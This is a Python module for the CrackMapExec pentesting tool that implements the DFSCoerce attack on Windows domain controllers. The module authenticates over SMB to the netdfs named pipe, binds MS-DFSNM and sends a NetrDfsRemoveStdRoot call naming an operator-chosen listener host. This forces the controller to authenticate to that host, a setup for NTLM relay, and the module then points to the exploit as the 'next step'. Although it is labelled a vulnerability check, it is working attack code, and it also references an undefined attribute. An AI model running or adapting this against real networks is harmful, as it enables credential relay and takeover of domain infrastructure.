#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import logging
from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import ULONG, WSTR, DWORD
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.uuid import uuidtup_to_bin

class CMEModule:
    
    name = 'dfscoerce'
    description = "Module to check if the DC is vulnerable to DFSCocerc, credit to @filip_dragovic/@Wh04m1001 and @topotam"
    supported_protocols = ['smb']
    opsec_safe = True 
    multiple_hosts = True 

    def options(self, context, module_options):
        self.listener = "127.0.0.1"
        if 'LISTENER' in module_options:
            self.listener = module_options['LISTENER']

    def on_login(self, context, connection):
        trigger = TriggerAuth()
        dce = trigger.connect(username=connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, target=connection.host)

        if dce is not None: 
            logging.debug("Target is vulnerable to DFSCoerce")
            trigger.NetrDfsRemoveStdRoot(dce, self.listener)
            context.log.highlight("VULNERABLE")
            context.log.highlight("Next step: https://github.com/Wh04m1001/DFSCoerce")
            dce.disconnect()
        
        else:
            logging.debug("Target is not vulnerable to DFSCoerce")
        
class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return 'DFSNM SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'DFSNM SessionError: unknown error code: 0x%x' % self.error_code

################################################################################
# RPC CALLS
################################################################################
class NetrDfsRemoveStdRoot(NDRCALL):
    opnum = 13
    structure = (
        ('ServerName', WSTR),
        ('RootShare', WSTR),
        ('ApiFlags', DWORD),
    )

class NetrDfsRemoveStdRootResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class NetrDfsAddRoot(NDRCALL):
    opnum = 12
    structure = (
         ('ServerName',WSTR),
         ('RootShare',WSTR),
         ('Comment',WSTR),
         ('ApiFlags',DWORD),
     )
class NetrDfsAddRootResponse(NDRCALL):
     structure = (
         ('ErrorCode', ULONG),
     )

class TriggerAuth():
    def connect(self, username, password, domain, lmhash, nthash, target):
        rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\PIPE\netdfs]' % target)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)

        #if doKerberos:
        #    rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        #if target:
        #    rpctransport.setRemoteHost(target)
        
        rpctransport.setRemoteHost(target)
        dce = rpctransport.get_dce_rpc()
        logging.debug("[-] Connecting to %s" % r'ncacn_np:%s[\PIPE\netdfs]' % target)
        try:
            dce.connect()
        except Exception as e:
            logging.debug("Something went wrong, check error status => %s" % str(e))
            return
        try:
            dce.bind(uuidtup_to_bin(('4FC742E0-4A10-11CF-8273-00AA004AE673', '3.0')))
        except Exception as e:
            logging.debug("Something went wrong, check error status => %s" % str(e))
            return
        logging.debug("[+] Successfully bound!")
        return dce

    def NetrDfsRemoveStdRoot(self, dce, listener):
        logging.debug("[-] Sending NetrDfsRemoveStdRoot!")
        try:
            request = NetrDfsRemoveStdRoot()
            request['ServerName'] = '%s\x00' % listener
            request['RootShare'] = 'test\x00'
            request['ApiFlags'] = 1
            if self.args.verbose:
                logging.debug(request.dump())
            #logging.debug(request.dump())
            resp = dce.request(request)

        except  Exception as e:
            logging.debug(e)